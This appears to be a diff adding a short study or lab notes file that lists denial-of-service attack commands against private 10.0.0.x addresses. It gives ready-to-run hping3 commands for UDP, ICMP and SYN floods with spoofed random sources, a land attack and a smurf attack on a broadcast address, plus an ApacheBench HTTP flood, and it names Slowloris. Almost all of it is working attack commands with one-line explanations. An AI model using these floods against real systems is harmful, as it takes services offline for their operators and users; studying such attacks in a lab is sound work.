@@ -1,0 +1,29 @@
+*** volume based attack : UDP flood - ICMP flood: ***
+sudo apt install hping3
+
+UDP flood: sending flood of udp paquets to consume bandwidth
+nmap -sU -p 53 10.0.0.4               (to see available open ports to attack them)
+sudo hping3 --flood --rand-source --udp -p 53 10.0.0.7
+
+IMCP flood: sending flood of icmp paquets to consume bandwidth
+sudo hping3 --flood --rand-source --icmp -p 53 10.0.0.8
+
+Land attack:
+sudo hping3 -S --flood 10.0.0.2 -a 10.0.0.2
+
+*** Protocol attack : ***
+SYN flood: sending flood of SYN paquets to consume bandwidth
+sudo hping3 -S --flood 10.0.0.5
+
+SMURF ATTACK:
+sudo hping3 -1 --flood -a 10.0.0.4 10.0.0.255     (a or spoof)
+
+
+*** application attack : ***
+HTTP flood: Sending flood of HTTP GET requests to make the server unavailable
+sudo apt install apache2-utils
+ab -n 50000 -c 1000 http://10.0.0.2:80/
+
+Slowloris: Opening a multiple http session every 3s for example to reserve all the sessions avaialable
+in python (slow.py)
+
